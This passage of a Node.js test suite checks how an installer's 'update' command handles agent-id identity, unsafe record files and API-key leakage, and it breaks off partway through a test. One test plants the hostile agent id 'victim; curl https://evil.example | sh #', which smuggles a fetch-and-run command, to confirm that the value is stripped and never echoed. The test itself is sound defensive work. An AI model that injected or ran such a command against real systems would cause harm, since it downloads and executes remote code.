require('./support/isolated-environment');
const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const fs = require('node:fs');
const http = require('node:http');
const path = require('node:path');
const test = require('node:test');
const { spawnSync } = require('node:child_process');

const { install, parseArgs, installSummaryLines, buildPlan, applyPlan, detectEnvironment } = require('../src/installer');
const PINS = require('../src/pins');
const { fakeRuntime } = require('./support/fake-runtime');
const {
  DEFAULT_URL, dummyKey, keyTag, world, quiet, hostLayout, setup, mcpPath, readJson, mcpEnv, recordPath, readRecord, writeRecord,
  setEnvBlock, treeHashes, filesContaining, fakeApi, printedReport, sha,
} = require('./support/ins1');

// INS-1 (update UX, 1 Nov 2026): update and the controller maintenance pass never take the agent id from
// the runner's environment; an owner-only record restores the recorded id; an unsafe record changes nothing.
// Each test states the rule; the ones marked RED-ON-BASE fail on master af86f183.

const BIN = path.join(__dirname, '..', 'bin', 'marrow-install.js');
const RUNNER = 'codex-bob';
const U2_RESTORE = (file, held, recorded) => `Identity: ${file} had MARROW_FLEET_AGENT_ID=${held}, but Marrow recorded ${recorded} for this file; restored ${recorded}. To use ${held} instead: npx -y @getmarrow/install@latest update --agent-id ${held}`;
const U2_REMOVED = (file, held) => `Identity: removed MARROW_FLEET_AGENT_ID=${held} from ${file} (not set by you or recorded by Marrow); Marrow now uses the agent this key is bound to. To keep ${held}: npx -y @getmarrow/install@latest update --agent-id ${held}`;
const CLAUDE_RECONNECT = 'Claude Code: type /mcp, pick marrow, then Reconnect.';
// What a running Marrow MCP server looks like in /proc: the verified local runtime on the inline loader.
const MCP_PROCESS = ['node', '-e', 'loader', `--package=@getmarrow/mcp@${PINS.MCP_ADAPTER_VERSION}`, 'marrow-mcp', ''].join('\0');

// The options `npx @getmarrow/install update --yes` builds, from the shell env of whoever runs it.
function updateFromShell(home, shellEnv, extra = {}, argv = ['update', '--yes']) {
  const parsed = parseArgs(argv, { HOME: home, PATH: process.env.PATH, ...shellEnv });
  return install({ ...parsed, ...quiet({ cwd: home, home, apiKey: '', mode: 'mcp' }), ...extra });
}
function summary(report, options = {}) {
  return installSummaryLines(report, options).lines;
}
function allText(report, options = {}) {
  return `${printedReport(report)}\n${summary(report, options).join('\n')}`;
}
// A home with Marrow set up for the one id (recorded), as the real thing looks after the first install.
async function recordedHome(ws, agentId = 'cliff-agent', hosts = {}) {
  hostLayout(ws.home, hosts);
  await setup(ws.home, { agentId });
  assert.equal(mcpEnv(ws.home).MARROW_FLEET_AGENT_ID, agentId);
  assert.equal(readRecord(ws.home)[mcpPath(ws.home)].MARROW_FLEET_AGENT_ID, agentId);
}

// ---- R1: the repro tests (reports/repro.patch, R1a-R1c), same bodies --------------------------------------------

test('R1a: update run from a shell carrying another agent id adds no identity to a config that had none', async () => {
  const ws = world();
  try {
    hostLayout(ws.home);
    await setup(ws.home);
    assert.equal(mcpEnv(ws.home).MARROW_FLEET_AGENT_ID, undefined);
    await updateFromShell(ws.home, { MARROW_FLEET_AGENT_ID: RUNNER });
    assert.equal(mcpEnv(ws.home).MARROW_FLEET_AGENT_ID, undefined, 'update wrote the runner shell agent id into ~/.mcp.json');
  } finally { ws.cleanup(); }
});

test('R1b: a config id that differs from the record is never replaced by the runner shell id (30 Oct case); the record wins', async () => {
  const ws = world();
  try {
    await recordedHome(ws, 'cliff-agent');
    setEnvBlock(mcpPath(ws.home), { MARROW_FLEET_AGENT_ID: 'cliff' }); // the hand "restore"
    await updateFromShell(ws.home, { MARROW_AGENT_ID: RUNNER });
    assert.notEqual(mcpEnv(ws.home).MARROW_FLEET_AGENT_ID, RUNNER, 'update took the identity from the runner shell');
    assert.equal(mcpEnv(ws.home).MARROW_FLEET_AGENT_ID, 'cliff-agent', 'the recorded id is restored');
  } finally { ws.cleanup(); }
});

test('R1c: the controller maintenance pass never rewrites a recorded identity with its own launch id', () => {
  const ws = world();
  try {
    fs.writeFileSync(mcpPath(ws.home), `${JSON.stringify({ mcpServers: { marrow: { command: 'node', args: ['marrow-mcp'], env: { MARROW_BASE_URL: DEFAULT_URL, MARROW_FLEET_AGENT_ID: 'cliff-agent' } } } }, null, 2)}\n`);
    writeRecord(ws.home, { [mcpPath(ws.home)]: { MARROW_FLEET_AGENT_ID: 'cliff-agent' } });
    const detection = detectEnvironment(ws.home, { HOME: ws.home, PATH: process.env.PATH });
    const plan = buildPlan(detection, { mode: 'mcp', agentId: RUNNER, baseUrl: DEFAULT_URL, maintenance: true, identityAllowlist: { baseUrls: new Set(), agentIds: new Set() } });
    applyPlan(plan, { yes: true, dryRun: false, doctor: false });
    assert.equal(mcpEnv(ws.home).MARROW_FLEET_AGENT_ID, 'cliff-agent', 'maintenance replaced the recorded id with the controller launch id');
  } finally { ws.cleanup(); }
});

// ---- T1, T1b, T1c: the runner's shell never supplies an id ---------------------------------------------------------

for (const [name, shellEnv] of [['T1', { MARROW_FLEET_AGENT_ID: RUNNER }], ['T1b', { MARROW_AGENT_ID: RUNNER }]]) {
  test(`${name}: parseArgs and update from a shell with ${Object.keys(shellEnv)[0]} write, record and send no runner id`, async () => {
    const ws = world();
    const key = dummyKey();
    const api = await fakeApi({ keys: { [keyTag(key)]: ['cliff-agent'] } });
    try {
      hostLayout(ws.home);
      await setup(ws.home);
      const parsed = parseArgs(['update', '--yes'], { HOME: ws.home, PATH: process.env.PATH, ...shellEnv });
      assert.equal(parsed.agentId, '', 'parseArgs carried the runner id into update');
      assert.equal(parsed.agentIdFromArg, undefined);
      const report = await updateFromShell(ws.home, shellEnv, { apiKey: key, baseUrl: api.url, selfTest: true, selfTestRetryDelayMs: 0 });
      assert.ok(api.seen.length > 0, 'the self-test ran against the fake server');
      assert.deepEqual([...new Set(api.seen.map((entry) => entry.agent))], [null], 'the self-test header carried an agent id');
      assert.equal(mcpEnv(ws.home).MARROW_FLEET_AGENT_ID, undefined);
      assert.deepEqual(filesContaining(ws.home, RUNNER), [], 'the runner id was written somewhere under the home');
      assert.equal(JSON.stringify(report).includes(RUNNER), false, 'the report names the runner id');
      assert.ok(!allText(report).includes(RUNNER));
    } finally { await api.close(); ws.cleanup(); }
  });
}

test('T1c: ids set by .envrc, a repo .env and an `env X=y` wrapper reach update as process env and are all ignored for identity', async () => {
  const ws = world();
  const key = dummyKey();
  const api = await fakeApi({ keys: { [keyTag(key)]: ['cliff-agent'] } });
  try {
    await recordedHome(ws, 'cliff-agent');
    fakeRuntime(ws.home, PINS.MCP_ADAPTER_VERSION, 'exit 0\n');
    // The files themselves are never read for identity; the exported values they give are process env.
    fs.writeFileSync(path.join(ws.home, '.envrc'), `export MARROW_FLEET_AGENT_ID=${RUNNER}\n`);
    fs.writeFileSync(path.join(ws.home, '.env'), `MARROW_AGENT_ID=${RUNNER}\n`);
    const held = [sha(path.join(ws.home, '.envrc')), sha(path.join(ws.home, '.env'))];
    // 1. wrapper `env X=y ... update`: the CLI process itself starts with the ids in its env (the test harness
    // refuses a node child started through env/sh, so the child is started directly with that same environment).
    const result = spawnSync(process.execPath, [BIN, 'update', '--yes', '--no-controller', '--no-self-test'], {
      cwd: ws.home,
      env: { PATH: process.env.PATH, HOME: ws.home, TMPDIR: process.env.TMPDIR, MARROW_API_KEY: key, MARROW_BASE_URL: api.url, MARROW_FLEET_AGENT_ID: RUNNER, MARROW_AGENT_ID: RUNNER },
      encoding: 'utf8',
      timeout: 120_000,
    });
    assert.equal(result.status, 0, `${result.stdout}\n${result.stderr}`);
    assert.equal(mcpEnv(ws.home).MARROW_FLEET_AGENT_ID, 'cliff-agent');
    assert.equal(readRecord(ws.home)[mcpPath(ws.home)].MARROW_FLEET_AGENT_ID, 'cliff-agent');
    const files = filesContaining(ws.home, RUNNER).filter((name) => !['.envrc', '.env'].includes(name));
    assert.deepEqual(files, [], 'the runner id was written by the CLI update');
    assert.deepEqual([sha(path.join(ws.home, '.envrc')), sha(path.join(ws.home, '.env'))], held);
    assert.ok(!`${result.stdout}${result.stderr}`.includes(key));
    // 2. the same ids from a subshell export, as parseArgs sees them.
    const parsed = parseArgs(['update', '--yes'], { HOME: ws.home, PATH: process.env.PATH, MARROW_FLEET_AGENT_ID: RUNNER, MARROW_AGENT_ID: RUNNER });
    assert.equal(parsed.agentId, '');
  } finally { await api.close(); ws.cleanup(); }
});

// ---- T2: config != record -> the record is restored, one exact line, then that host's restart line ----------------

test('T2: a config id that differs from the record gets the record back; the U2 line is exact and the host gets its restart line', async () => {
  for (const held of ['cliff', undefined]) { // changed by hand, and removed by hand
    const ws = world();
    try {
      await recordedHome(ws, 'cliff-agent');
      setEnvBlock(mcpPath(ws.home), { MARROW_FLEET_AGENT_ID: held });
      const report = await updateFromShell(ws.home, { MARROW_FLEET_AGENT_ID: RUNNER }, { processCommands: [MCP_PROCESS] });
      assert.equal(mcpEnv(ws.home).MARROW_FLEET_AGENT_ID, 'cliff-agent');
      assert.equal(readRecord(ws.home)[mcpPath(ws.home)].MARROW_FLEET_AGENT_ID, 'cliff-agent');
      const lines = summary(report);
      const wanted = held
        ? U2_RESTORE(mcpPath(ws.home), held, 'cliff-agent')
        : `Identity: ${mcpPath(ws.home)} had no MARROW_FLEET_AGENT_ID, but Marrow recorded cliff-agent for this file; restored cliff-agent.`;
      assert.equal(lines.filter((line) => line.startsWith('Identity:')).length, 1, `one identity line, got ${JSON.stringify(lines)}`);
      assert.ok(lines.includes(wanted), `exact U2 line missing: ${JSON.stringify(lines)}`);
      // M7: a changed marrow env block always names the host's next step; a running Claude Code server gets /mcp Reconnect.
      assert.ok(lines.includes(CLAUDE_RECONNECT), `no Reconnect line: ${JSON.stringify(lines)}`);
      assert.ok(!lines.some((line) => /Nothing else to do/.test(line)));
      assert.ok(printedReport(report).includes(wanted));
    } finally { ws.cleanup(); }
  }
});

test('T2 (M7, G9): with the process list unavailable the restart line is printed for every set-up host, prefixed, never "Nothing else to do."', async () => {
  const ws = world();
  try {
    await recordedHome(ws, 'cliff-agent', { cursor: true });
    // A Cursor project file with the id changed by hand, in a record that names it.
    const project = path.join(ws.base, 'project');
    fs.mkdirSync(path.join(project, '.cursor'), { recursive: true });
    fs.writeFileSync(path.join(project, 'package.json'), '{}\n');
    await setup(project, { home: ws.home, agentId: 'cursor-a' });
    const cursorFile = path.join(project, '.cursor', 'mcp.json');
    const claudeFile = path.join(project, '.mcp.json');
    setEnvBlock(cursorFile, { MARROW_FLEET_AGENT_ID: 'drifted' });
    setEnvBlock(claudeFile, { MARROW_FLEET_AGENT_ID: 'drifted' });
    const report = await updateFromShell(project, { MARROW_FLEET_AGENT_ID: RUNNER }, { home: ws.home, processCommands: undefined, procRoot: path.join(ws.base, 'no-proc') });
    assert.equal(mcpEnv(ws.home, cursorFile).MARROW_FLEET_AGENT_ID, 'cursor-a');
    const lines = summary(report);
    assert.ok(lines.includes('If Claude Code is open: type /mcp, pick marrow, then Reconnect.'), JSON.stringify(lines));
    assert.ok(lines.includes('If Cursor is open: restart Cursor.'), JSON.stringify(lines));
    assert.ok(!lines.some((line) => /Nothing else to do/.test(line)));
  } finally { ws.cleanup(); }
});

// ---- T3: an unsafe record changes nothing at all ---------------------------------------------------------------------

const UNSAFE_STATES = [
  ['group-writable record', (home) => fs.chmodSync(recordPath(home), 0o660), /chmod 700 ~\/\.marrow && chmod 600 /],
  ['group-writable ~/.marrow', (home) => fs.chmodSync(path.join(home, '.marrow'), 0o770), /chmod 700 ~\/\.marrow/],
  ['symlinked record', (home) => {
    const real = path.join(home, 'elsewhere.json');
    fs.copyFileSync(recordPath(home), real);
    fs.chmodSync(real, 0o600);
    fs.rmSync(recordPath(home));
    fs.symlinkSync(real, recordPath(home));
  }, /replace the link with a regular owner-only file/],
  ['record with two hard links', (home) => fs.linkSync(recordPath(home), path.join(home, 'second-link.json')), /remove the extra link/],
  ['record that is not JSON', (home) => fs.writeFileSync(recordPath(home), '{not json', { mode: 0o600 }), /delete it, then run update again with --agent-id <id>/],
];
if (typeof process.getuid === 'function' && process.getuid() === 0) {
  UNSAFE_STATES.push(['record owned by another user', (home) => fs.chownSync(recordPath(home), 65534, 65534), /delete it, then run update again with --agent-id <id>/]);
}

for (const [label, damage, fix] of UNSAFE_STATES) {
  test(`T3: ${label}: update writes nothing at all, prints one line with the fix for that state, and exits 3`, async () => {
    const ws = world();
    const key = dummyKey();
    try {
      await recordedHome(ws, 'cliff-agent');
      setEnvBlock(mcpPath(ws.home), { MARROW_FLEET_AGENT_ID: 'drifted' }); // something update would change
      damage(ws.home);
      const before = treeHashes(ws.home);
      // The CLI: exit code and the exact output.
      const cli = spawnSync(process.execPath, [BIN, 'update', '--yes', '--no-controller', '--no-self-test'], {
        cwd: ws.home,
        env: { PATH: process.env.PATH, HOME: ws.home, TMPDIR: process.env.TMPDIR, MARROW_API_KEY: key, MARROW_FLEET_AGENT_ID: RUNNER },
        encoding: 'utf8',
        timeout: 120_000,
      });
      assert.equal(cli.status, 3, `${cli.stdout}\n${cli.stderr}`);
      const lines = cli.stdout.split('\n').filter(Boolean);
      assert.equal(lines.length, 1, `exactly one line, got ${JSON.stringify(lines)}`);
      assert.equal(cli.stderr, '');
      assert.match(lines[0], /^Identity: /);
      assert.match(lines[0], fix);
      if (/symlink/.test(label)) assert.doesNotMatch(lines[0], /chmod/, 'never chmod through a link');
      assert.ok(!lines[0].includes(RUNNER) && !cli.stdout.includes(key));
      assert.deepEqual(treeHashes(ws.home), before, 'a file under the home changed');
      // The library call: the same stop, and no write, record, runtime or hook.
      const report = await updateFromShell(ws.home, { MARROW_FLEET_AGENT_ID: RUNNER }, { agentId: RUNNER });
      assert.equal(report.identity_stop?.exitCode, 3);
      assert.deepEqual(treeHashes(ws.home), before);
    } finally { ws.cleanup(); }
  });
}

test('T3: --agent-id does not get past an unsafe record, and a dry run stops the same way', async () => {
  const ws = world();
  try {
    await recordedHome(ws, 'cliff-agent');
    fs.chmodSync(recordPath(ws.home), 0o666);
    const before = treeHashes(ws.home);
    for (const argv of [['update', '--yes', '--agent-id', 'cliff-2'], ['update', '--dry-run']]) {
      const report = await updateFromShell(ws.home, {}, {}, argv);
      assert.equal(report.identity_stop?.exitCode, 3, argv.join(' '));
    }
    assert.deepEqual(treeHashes(ws.home), before);
  } finally { ws.cleanup(); }
});

// ---- T5: --agent-id is the explicit way to set an id -------------------------------------------------------------

test('T5: --agent-id x sets x, records it and prints (--agent-id); an env id beside it is not used', async () => {
  const ws = world();
  try {
    await recordedHome(ws, 'cliff-agent');
    const parsed = parseArgs(['update', '--agent-id', 'cliff-2'], { HOME: ws.home, MARROW_FLEET_AGENT_ID: RUNNER });
    assert.equal(parsed.agentId, 'cliff-2');
    assert.equal(parsed.agentIdFromArg, true);
    const report = await updateFromShell(ws.home, { MARROW_FLEET_AGENT_ID: RUNNER }, {}, ['update', '--agent-id', 'cliff-2']);
    assert.equal(mcpEnv(ws.home).MARROW_FLEET_AGENT_ID, 'cliff-2');
    assert.equal(readRecord(ws.home)[mcpPath(ws.home)].MARROW_FLEET_AGENT_ID, 'cliff-2');
    assert.match(printedReport(report), /reset MARROW_FLEET_AGENT_ID cliff-agent -> cliff-2 in .* \(--agent-id\)/);
    assert.ok(!allText(report).includes(RUNNER));
  } finally { ws.cleanup(); }
});

// ---- T6: two hosts, two agents --------------------------------------------------------------------------------------

test('T6: ~/.mcp.json cliff-agent, a project .cursor/mcp.json cursor-a (both recorded) and Grok managed hooks are all kept after an update from another shell', async () => {
  const ws = world();
  try {
    await recordedHome(ws, 'cliff-agent', { grok: true });
    const project = path.join(ws.base, 'project');
    fs.mkdirSync(path.join(project, '.cursor'), { recursive: true });
    fs.writeFileSync(path.join(project, 'package.json'), '{}\n');
    await setup(project, { home: ws.home, agentId: 'cursor-a' });
    const cursorFile = path.join(project, '.cursor', 'mcp.json');
    assert.equal(mcpEnv(ws.home, cursorFile).MARROW_FLEET_AGENT_ID, 'cursor-a');
    const grokFile = path.join(ws.home, '.grok', 'hooks', 'marrow.json');
    assert.ok(fs.existsSync(grokFile), 'Grok managed hooks were written by setup');
    const grokBefore = sha(grokFile);
    await updateFromShell(ws.home, { MARROW_FLEET_AGENT_ID: RUNNER });
    await updateFromShell(project, { MARROW_FLEET_AGENT_ID: RUNNER }, { home: ws.home });
    assert.equal(mcpEnv(ws.home).MARROW_FLEET_AGENT_ID, 'cliff-agent');
    assert.equal(mcpEnv(ws.home, cursorFile).MARROW_FLEET_AGENT_ID, 'cursor-a');
    assert.equal(sha(grokFile), grokBefore, 'Grok managed hooks changed');
    assert.deepEqual(filesContaining(ws.home, RUNNER), []);
    assert.deepEqual(filesContaining(project, RUNNER), []);
  } finally { ws.cleanup(); }
});

// ---- T7, T7b: a planted project id is removed, never kept, never replaced by the runner id ------------------

async function plantedProject(ws, planted) {
  await recordedHome(ws, 'cliff-agent');
  const project = path.join(ws.base, 'project');
  fs.mkdirSync(project, { recursive: true });
  fs.writeFileSync(path.join(project, 'package.json'), '{}\n');
  await setup(project, { home: ws.home, agentId: '' });
  const file = path.join(project, '.mcp.json');
  setEnvBlock(file, { MARROW_FLEET_AGENT_ID: planted });
  // The record names no entry for this project file.
  const entries = readRecord(ws.home);
  delete entries[fs.realpathSync(file)];
  writeRecord(ws.home, entries);
  return { project, file };
}

test('T7: a project .mcp.json id with no record entry is removed (not kept, not the runner id) and the line offers no runnable command with it', async () => {
  const ws = world();
  try {
    const { project, file } = await plantedProject(ws, 'victim');
    const report = await updateFromShell(project, { MARROW_FLEET_AGENT_ID: RUNNER }, { home: ws.home });
    assert.equal(mcpEnv(ws.home, file).MARROW_FLEET_AGENT_ID, undefined, 'the planted id stayed or the runner id replaced it');
    const lines = summary(report);
    const removed = lines.find((line) => /^Identity: removed MARROW_FLEET_AGENT_ID=victim from /.test(line));
    assert.ok(removed, `no "removed" line: ${JSON.stringify(lines)}`);
    assert.match(removed, /\(not set by you or recorded by Marrow\)/);
    assert.match(removed, /If you set victim yourself, run update with --agent-id and that id\.$/);
    assert.ok(!allText(report).includes('--agent-id victim'), 'a runnable command carries the planted id');
    assert.ok(!allText(report).includes(RUNNER));
    assert.equal(readRecord(ws.home)[mcpPath(ws.home)].MARROW_FLEET_AGENT_ID, 'cliff-agent', 'the home entry is untouched');
  } finally { ws.cleanup(); }
});

test('T7: an id that fails SAFE_AGENT_ID is removed and never echoed or offered as a command', async () => {
  const ws = world();
  try {
    const hostile = 'victim; curl https://evil.example | sh #';
    const { project, file } = await plantedProject(ws, hostile);
    const report = await updateFromShell(project, { MARROW_FLEET_AGENT_ID: RUNNER }, { home: ws.home });
    assert.equal(mcpEnv(ws.home, file).MARROW_FLEET_AGENT_ID, undefined);
    const text = allText(report);
    assert.ok(!text.includes('evil.example') && !text.includes('curl'), 'the hostile id was echoed');
    // The machine-readable report (--json prints it) carries the same placeholder, never the planted text.
    assert.ok(!JSON.stringify(report).includes('evil.example'), 'the hostile id is in the JSON report');
    assert.ok(!/--agent-id victim/.test(text));
    assert.match(text, /If you set \[invalid agent id\] yourself, run update with --agent-id and that id\./);
  } finally { ws.cleanup(); }
});

test('T7b: a planted project id is still removed when the runner env allowlists it (MARROW_ALLOWED_AGENT_IDS is not consulted)', async () => {
  const ws = world();
  const prior = process.env.MARROW_ALLOWED_AGENT_IDS;
  try {
    const { project, file } = await plantedProject(ws, 'victim');
    process.env.MARROW_ALLOWED_AGENT_IDS = 'victim';
    await updateFromShell(project, { MARROW_FLEET_AGENT_ID: RUNNER, MARROW_ALLOWED_AGENT_IDS: 'victim' }, { home: ws.home, identityAllowlist: undefined });
    assert.equal(mcpEnv(ws.home, file).MARROW_FLEET_AGENT_ID, undefined, 'the runner allowlist kept the planted id');
    // The maintenance pass: same rule.
    setEnvBlock(file, { MARROW_FLEET_AGENT_ID: 'victim' });
    const detection = detectEnvironment(project, { HOME: ws.home, PATH: process.env.PATH });
    applyPlan(buildPlan(detection, { mode: 'mcp', agentId: RUNNER, baseUrl: DEFAULT_URL, maintenance: true }), { yes: true, dryRun: false, doctor: false });
    assert.equal(mcpEnv(ws.home, file).MARROW_FLEET_AGENT_ID, undefined, 'maintenance kept an allowlisted planted id');
  } finally {
    if (prior === undefined) delete process.env.MARROW_ALLOWED_AGENT_IDS;
    else process.env.MARROW_ALLOWED_AGENT_IDS = prior;
    ws.cleanup();
  }
});

// ---- T13: the flags ---------------------------------------------------------------------------------------------------

test('T13: --agent-id repeated: the last wins; an empty or missing value is refused and never falls back to the env id; --fix-identity cannot be combined', () => {
  const env = { HOME: '/nonexistent-home', MARROW_FLEET_AGENT_ID: RUNNER, MARROW_AGENT_ID: RUNNER };
  const parsed = parseArgs(['update', '--agent-id', 'a', '--agent-id', 'b'], env);
  assert.equal(parsed.agentId, 'b');
  assert.equal(parsed.agentIdFromArg, true);
  for (const argv of [
    ['update', '--agent-id', ''],
    ['update', '--agent-id=' ],
    ['update', '--agent-id'],
    ['update', '--agent-id', '--yes'],
    ['update', '--agent-id', 'a', '--agent-id', ''],
  ]) {
    assert.throws(() => parseArgs(argv, env), /--agent-id (?:needs|cannot)/, `refused: ${JSON.stringify(argv)}`);
  }
  for (const argv of [['update', '--agent-id', 'x', '--fix-identity'], ['update', '--fix-identity', '--agent-id', 'x']]) {
    assert.throws(() => parseArgs(argv, env), /--agent-id and --fix-identity cannot be combined/, JSON.stringify(argv));
  }
  assert.throws(() => parseArgs(['--fix-identity'], env), /--fix-identity is an option of update/);
  assert.equal(parseArgs(['update', '--fix-identity'], env).fixIdentity, true);
  assert.equal(parseArgs(['update', '--fix-identity'], env).agentId, '');
});

// ---- T14: only the agent id handling changed -------------------------------------------------------------------------

test('T14: MARROW_BASE_URL, MARROW_TOOL_PROFILE and unknown owner env keys are handled exactly as before', async () => {
  const ws = world();
  try {
    await recordedHome(ws, 'cliff-agent');
    const file = mcpPath(ws.home);
    setEnvBlock(file, { MARROW_TOOL_PROFILE: 'core', MARROW_OWNER_NOTE: 'keep-me', MARROW_BASE_URL: 'https://redirect.example.test' });
    const before = readJson(file).mcpServers.marrow;
    const report = await updateFromShell(ws.home, { MARROW_FLEET_AGENT_ID: RUNNER });
    const after = readJson(file).mcpServers.marrow;
    assert.equal(after.env.MARROW_TOOL_PROFILE, 'core', 'tool profile kept as before');
    assert.equal(after.env.MARROW_BASE_URL, DEFAULT_URL, 'a base URL the owner did not allowlist is replaced as before');
    assert.equal(after.env.MARROW_FLEET_AGENT_ID, 'cliff-agent');
    assert.deepEqual(Object.keys(after.env).sort(), ['MARROW_BASE_URL', 'MARROW_FLEET_AGENT_ID', 'MARROW_TOOL_PROFILE'], 'env block keys as before (the block is rebuilt, owner keys are not carried)');
    assert.deepEqual(after.command, before.command);
    assert.match(printedReport(report), /reset MARROW_BASE_URL https:\/\/redirect\.example\.test -> https:\/\/api\.getmarrow\.ai in /);
    // An allowlisted base URL is kept as before.
    setEnvBlock(file, { MARROW_BASE_URL: 'https://redirect.example.test' });
    await updateFromShell(ws.home, {}, { identityAllowlist: { baseUrls: new Set(['https://redirect.example.test']), agentIds: new Set() } });
    assert.equal(mcpEnv(ws.home).MARROW_BASE_URL, 'https://redirect.example.test');
  } finally { ws.cleanup(); }
});

// ---- T-SEC, M9: no key anywhere -------------------------------------------------------------------------------------

test('T-SEC (M9): no dummy key in any output, report or file the update writes; a Hermes config keeps another provider key, its mode and its bytes', async () => {
  const ws = world();
  const runnerKey = dummyKey();
  const fileKey = dummyKey();
  const providerKey = dummyKey();
  try {
    // Hermes: its config.yaml (a credential store) holds another provider's key before Marrow is set up.
    const hermes = path.join(ws.home, '.hermes', 'config.yaml');
    fs.mkdirSync(path.join(ws.home, '.hermes'), { recursive: true, mode: 0o700 });
    fs.writeFileSync(hermes, `model: x\nproviders:\n  other:\n    api_key: ${providerKey}\n`, { mode: 0o600 });
    await recordedHome(ws, 'cliff-agent');
    fs.mkdirSync(path.join(ws.home, '.marrow'), { recursive: true, mode: 0o700 });
    fs.writeFileSync(path.join(ws.home, '.marrow', 'env'), `MARROW_API_KEY=${fileKey}\n`, { mode: 0o600 });
    assert.ok(/marrow/.test(fs.readFileSync(hermes, 'utf8')), 'setup wrote the Hermes marrow entry');
    const providerLine = `    api_key: ${providerKey}`;
    setEnvBlock(mcpPath(ws.home), { MARROW_FLEET_AGENT_ID: 'drifted', MARROW_API_KEY: fileKey });
    const before = treeHashes(ws.home);
    const report = await updateFromShell(ws.home, { MARROW_FLEET_AGENT_ID: RUNNER }, { apiKey: runnerKey });
    const text = `${JSON.stringify(report)}\n${allText(report)}`;
    for (const secret of [runnerKey, fileKey, providerKey]) assert.ok(!text.includes(secret), 'a dummy key reached the output');
    for (const secret of [runnerKey, providerKey]) {
      assert.deepEqual(filesContaining(path.join(ws.home), secret).filter((name) => name !== path.relative(ws.home, hermes)), [], 'a key was copied into a file');
    }
    // The file-held key may only sit where it already was: the env file, and the config block that held it.
    assert.deepEqual(filesContaining(ws.home, fileKey).sort(), filesContaining(ws.home, fileKey).filter((name) => ['.marrow/env', '.mcp.json'].includes(name)).sort());
    assert.ok(fs.readFileSync(hermes, 'utf8').includes(providerLine), 'the other provider key changed');
    assert.equal(fs.statSync(hermes).mode & 0o777, 0o600, 'the Hermes config mode changed');
    assert.ok(!fs.readdirSync(path.join(ws.home, '.hermes')).some((name) => name !== 'config.yaml' && fs.readFileSync(path.join(ws.home, '.hermes', name)).includes(providerKey)), 'a temp or undo file holds the provider key');
    const after = treeHashes(ws.home);
    const added = Object.keys(after).filter((name) => !(name in before));
    for (const name of added) assert.ok(!/\.(bak|orig|undo)$|~$/.test(name), `backup-like file ${name}`);
    for (const name of added.filter((entry) => after[entry] !== 'dir')) {
      for (const secret of [runnerKey, fileKey, providerKey]) assert.ok(!fs.readFileSync(path.join(ws.home, name)).includes(secret), `new file ${name} holds a key`);
    }
  } finally { ws.cleanup(); }
});

// ---- T15 (M8): consumers, the (key source, agent id) pair each host sends ---------------------------------------

// An offline model of what the pinned MCP resolves for a host: the host merges the config's marrow env block over
// its own (launcher) env; the id is MARROW_FLEET_AGENT_ID, else MARROW_AGENT_ID; the key comes from the block, the
// host env, or the owner file. (The vendored dist/env.js is not in test/fixtures/mcp-3.9.109, so this models the
// documented rule instead of loading it.)
function oracle(file, launcherEnv, home) {
  let block = {};
  try { block = readJson(file).mcpServers.marrow.env || {}; } catch { block = {}; }
  const merged = { ...launcherEnv, ...block };
  const owner = fs.existsSync(path.join(home, '.marrow', 'env'));
  const keySource = block.MARROW_API_KEY ? 'env-block' : launcherEnv.MARROW_API_KEY ? 'host-env' : owner ? 'owner-file' : 'none';
  return { keySource, agentId: merged.MARROW_FLEET_AGENT_ID || merged.MARROW_AGENT_ID || '' };
}

test('T15: the (key source, agent id) pair each consumer sends is unchanged by update, except the reported restore; a receipt minted before commits after', async () => {
  const ws = world();
  const ledger = new Map();
  const seen = [];
  const server = http.createServer((req, res) => {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      const agent = req.headers['x-marrow-agent-id'] || '';
      seen.push({ url: req.url, agent });
      res.setHeader('content-type', 'application/json');
      if (req.url === '/v1/agent/think') {
        const id = `dec-${ledger.size + 1}`;
        ledger.set(id, agent);
        return res.end(JSON.stringify({ data: { decision_id: id } }));
      }
      if (req.url === '/v1/agent/commit') {
        const wanted = ledger.get(JSON.parse(body).decision_id);
        res.statusCode = wanted === agent ? 200 : 409;
        return res.end(JSON.stringify({ committed: wanted === agent }));
      }
      return res.end('{}');
    });
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  try {
    await recordedHome(ws, 'cliff-agent', { cursor: true, grok: true });
    const project = path.join(ws.base, 'project');
    fs.mkdirSync(path.join(project, '.cursor'), { recursive: true });
    fs.writeFileSync(path.join(project, 'package.json'), '{}\n');
    await setup(project, { home: ws.home, agentId: 'cursor-a' });
    const cursorFile = path.join(project, '.cursor', 'mcp.json');
    const launcher = { MARROW_FLEET_AGENT_ID: 'cliff-agent' }; // what the host's launcher exports for hooks
    const hosts = [
      ['C8 ~/.mcp.json', mcpPath(ws.home), launcher],
      ['C8 project cursor', cursorFile, { MARROW_FLEET_AGENT_ID: 'cursor-a' }],
      ['C9 hooks (launcher env only)', path.join(ws.home, '.claude', 'settings.json'), launcher],
      ['C9 grok hooks (launcher env only)', path.join(ws.home, '.grok', 'hooks', 'marrow.json'), launcher],
    ];
    const pairsBefore = hosts.map(([, file, env]) => oracle(file, env, ws.home));
    // C1-C7: a receipt (decision) minted under the id the host sends before the update.
    const post = (route, agent, payload) => new Promise((resolve, reject) => {
      const request = http.request(`http://127.0.0.1:${server.address().port}${route}`, { method: 'POST', headers: { 'x-marrow-agent-id': agent, 'content-type': 'application/json' } }, (res) => {
        let text = '';
        res.on('data', (chunk) => { text += chunk; });
        res.on('end', () => resolve({ status: res.statusCode, body: text }));
      });
      request.on('error', reject);
      request.end(JSON.stringify(payload));
    });
    const minted = JSON.parse((await post('/v1/agent/think', pairsBefore[0].agentId, {})).body).data.decision_id;
    await updateFromShell(ws.home, { MARROW_FLEET_AGENT_ID: RUNNER });
    await updateFromShell(project, { MARROW_FLEET_AGENT_ID: RUNNER }, { home: ws.home });
    const pairsAfter = hosts.map(([, file, env]) => oracle(file, env, ws.home));
    assert.deepEqual(pairsAfter, pairsBefore, 'a host would send a different (key source, agent id) pair after update');
    assert.ok(pairsAfter.every((pair) => pair.agentId !== RUNNER));
    const commit = await post('/v1/agent/commit', pairsAfter[0].agentId, { decision_id: minted });
    assert.equal(commit.status, 200, 'a receipt minted before the update did not commit after it under the same id');
    // The one reported change: a drifted file gets its recorded id back, and only that pair moves.
    setEnvBlock(cursorFile, { MARROW_FLEET_AGENT_ID: 'drifted' });
    const drifted = oracle(cursorFile, { MARROW_FLEET_AGENT_ID: 'cursor-a' }, ws.home);
    assert.equal(drifted.agentId, 'drifted');
